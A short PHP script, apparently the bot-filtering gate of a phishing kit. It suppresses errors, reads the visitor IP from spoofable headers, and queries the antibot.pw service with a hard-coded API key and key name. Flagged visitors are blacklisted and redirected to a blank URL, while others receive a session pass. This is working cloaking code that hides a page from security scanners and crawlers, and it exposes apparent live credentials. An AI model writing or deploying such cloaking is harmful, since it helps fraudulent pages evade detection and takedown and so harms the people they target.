<?php


error_reporting(0);

function getUserIPss()
{
    // Get real visitor IP behind CloudFlare network
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
              $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
              $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}


define("ANTIBOT_API", '12c9301fd9ea1223c53db4521dc2f9e0');
define("ANTIBOT_KEY", 'lkPw6A0');
passport();
function passport() {
  $ip = getUserIPss();

  if( $_SESSION['passport'] == 1 )
    return;
  $list = file("blacklist.txt", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
  if (in_array($ip, $list)) {
    header('Location: https://');
    exit();
  }
  $ua = str_replace(' ', '', $_SERVER['HTTP_USER_AGENT']);
  $check = json_decode(file_get_contents('https://antibot.pw/api/v2-manager?ip='. $ip .'&keyname='. ANTIBOT_KEY .'&apikey='. ANTIBOT_API .'&ua=' . $ua),true);
  $is_bot = $check['block_access'];
  if( $is_bot == 1 ) {
    file_put_contents("blacklist.txt", $ip . "\r\n", FILE_APPEND);
    header('Location: https://');
    exit();
  } else {
    $_SESSION['passport'] = 1;

  }
}

?>